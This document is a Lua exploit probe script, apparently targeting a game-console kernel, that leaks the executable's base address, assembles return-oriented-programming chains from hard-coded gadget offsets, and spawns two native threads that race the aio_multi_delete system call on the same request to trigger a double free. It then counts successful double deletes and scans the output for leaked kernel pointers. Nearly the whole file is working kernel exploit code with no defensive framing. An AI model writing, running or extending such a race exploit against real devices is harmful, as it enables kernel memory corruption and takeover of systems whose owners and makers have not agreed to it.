-- CRASH_CLASS: HIGH
-- PROBE 65i: aio_multi_delete TOCTOU — two native children race
--
-- 65h: poll+delete works, but child always beats main (native vs Lua).
-- Fix: TWO child threads both calling 662. Both run at native speed.
-- Main thread: submit, poll, spawn both children, wait, check results.
--
-- Child A: sysarch + 662(id) + thr_exit
-- Child B: sysarch + 662(id) + thr_exit
-- If both get state=0 → double free confirmed.

print("=== PROBE 65i: aio race — 2 native children ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
print("fn_addr=" .. fmt(stub))
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_pop_rcx = eb + 0xE64
local g_bare_ret = eb + 0x42

-- Ignore signals
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)

-- Shared fake TCB
local tcb = memory.alloc(0x1000)
local tcb_a = N(tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

-- /dev/zero
local fd_zero = -1
repeat
    local ok, rv = pcall(function() return mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)) end)
    if ok then fd_zero = sgn(rv) end
until true
print("/dev/zero fd=" .. fd_zero)
if fd_zero < 0 then print("ABORT"); return end

-- AIO buffers
local reqs = memory.alloc(0x200)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local poll_ids = memory.alloc(0x100)
local poll_states = memory.alloc(0x100)

-- Per-child buffers (A and B)
local ids_A = memory.alloc(0x100)
local states_A = memory.alloc(0x100)
local ids_B = memory.alloc(0x100)
local states_B = memory.alloc(0x100)

-- Synchronization: gate flag
-- Children spin-wait on this flag, then call 662 when it becomes nonzero
local gate = memory.alloc(0x100)

local function fill_req(base, fd)
    wq(base + 0x00, uint64(0))
    wq(base + 0x08, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(base + 0x10, bl); wd(base + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(base + 0x18, rl); wd(base + 0x1C, rh)
    wd(base + 0x20, fd)
    wd(base + 0x24, 0)
end

local function aio_submit(fd)
    fill_req(N(reqs), fd)
    wd(N(result_buf), 0)
    wd(N(poll_ids), 0)
    local ok, rv = pcall(function()
        return mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(poll_ids)))
    end)
    return ok and sgn(rv) or nil, rd(N(poll_ids)) or 0
end

local function aio_poll_main(id)
    wd(N(poll_ids), id)
    wd(N(poll_states), 0)
    pcall(function()
        mk(664)(uint64(N(poll_ids)), uint64(1), uint64(N(poll_states)))
    end)
    return rd(N(poll_states)) or 0
end

local function aio_delete_main(id)
    wd(N(poll_ids), id)
    wd(N(poll_states), 0xDEADDEAD)
    local ok, rv = pcall(function()
        return mk(662)(uint64(N(poll_ids)), uint64(1), uint64(N(poll_states)))
    end)
    return ok and sgn(rv) or nil, rd(N(poll_states)) or 0
end

local function build_child(child_ids, child_states)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local ss = 0x2000
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    for i = 0, ss - 1, 4 do wd(sb + i, 0) end

    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    -- sysarch(SET_FSBASE=129)
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(fs_ptr)))
    emit(g_pop_rax); emit(uint64(165))
    emit(stub)

    -- 662(child_ids, 1, child_states)
    emit(g_pop_rdi); emit(uint64(N(child_ids)))
    emit(g_pop_rsi); emit(uint64(1))
    emit(g_pop_rdx); emit(uint64(N(child_states)))
    emit(g_pop_rax); emit(uint64(662))
    emit(stub)

    -- thr_exit(0)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)

    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa, g_bare_ret)
    wq(pa + 8, uint64(0))
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid_buf = memory.alloc(8); wq(N(tid_buf), uint64(0))
    wq(pa + 0x30, tid_buf)

    return par
end

-- [A] Sanity
print("")
print("[A] sanity — poll+delete")
local s_ret, s_id = aio_submit(fd_zero)
local p_state = aio_poll_main(s_id)
local d_ret, d_state = aio_delete_main(s_id)
print(string.format("  id=0x%X poll=0x%X delete=0x%X (%s)",
    s_id, p_state, d_state, d_state == 0 and "OK" or "FAIL"))
if d_state ~= 0 then print("ABORT: delete broken"); return end

-- [B] Race loop
print("")
print("[B] TOCTOU race — 2 children")

local ITERS = 25
local double_del = 0
local a_wins = 0
local b_wins = 0
local both_fail = 0
local kptrs = 0

for iter = 1, ITERS do
    if not alive() then
        print(string.format("  iter %d: *** DEAD (possible UAF crash!) ***", iter))
        break
    end

    -- Submit + poll (prerequisite for delete)
    local sr, sid = aio_submit(fd_zero)
    if sr ~= 0 or sid == 0 then
        print(string.format("  iter %d: submit failed", iter))
        break
    end
    aio_poll_main(sid)

    -- Prepare both children's buffers with the same ID
    wd(N(ids_A), sid)
    wq(N(states_A), uint64(0xAAAAAAAA))
    wd(N(ids_B), sid)
    wq(N(states_B), uint64(0xBBBBBBBB))

    -- Build two child threads
    local par_A = build_child(ids_A, states_A)
    local par_B = build_child(ids_B, states_B)

    -- Spawn both as fast as possible
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)

    -- Wait for both to finish
    for w = 1, 40000 do local _ = rd(N(ids_A)) end

    -- Read results
    local ra = rq(N(states_A))
    local rb = rq(N(states_B))
    local ah, al = get_hi_lo(ra)
    local bh, bl = get_hi_lo(rb)

    local a_ok = (al == 0 and ah == 0)
    local b_ok = (bl == 0 and bh == 0)
    local a_sent = (al ~= 0xAAAAAAAA)  -- child A executed
    local b_sent = (bl ~= 0xBBBBBBBB)  -- child B executed

    if a_ok and b_ok then
        double_del = double_del + 1
        print(string.format("  iter %d: *** DOUBLE DELETE *** A=0 B=0", iter))
    elseif a_ok and not b_ok then
        a_wins = a_wins + 1
    elseif b_ok and not a_ok then
        b_wins = b_wins + 1
    else
        both_fail = both_fail + 1
    end

    -- Show first few and last
    if iter <= 5 or iter == ITERS or (a_ok and b_ok) then
        print(string.format("  iter %d: A=%s B=%s %s",
            iter, fmt(ra), fmt(rb),
            a_ok and b_ok and "*** DOUBLE ***" or
            a_ok and "(A won)" or
            b_ok and "(B won)" or
            (not a_sent or not b_sent) and "(child didn't run?)" or "(both fail)"))
    elseif iter == 6 then
        print("  ...")
    end

    -- kptr check
    for _, v in ipairs({ra, rb}) do
        local vh, vl = get_hi_lo(v)
        if vh ~= 0 and vh ~= 0xFFFFFFFF and vh >= 0xFFFF8000 then
            kptrs = kptrs + 1
            print(string.format("  iter %d: *** KPTR: %s ***", iter, fmt(v)))
        end
    end

    -- Cleanup: delete if still around (one child should have deleted it)
    aio_delete_main(sid)
end

print("")
print("[C] SUMMARY")
print(string.format("  iterations:      %d", ITERS))
print(string.format("  DOUBLE DELETES:  %d", double_del))
print(string.format("  A won:           %d", a_wins))
print(string.format("  B won:           %d", b_wins))
print(string.format("  both failed:     %d", both_fail))
print(string.format("  kernel pointers: %d", kptrs))
print(string.format("  process:         %s", alive() and "ALIVE" or "DEAD"))

if double_del > 0 then
    print("")
    print("****************************************************")
    print("*** DOUBLE FREE CONFIRMED — UAF IS LIVE          ***")
    print("****************************************************")
end

print("")
print("=== 65i COMPLETE ===")
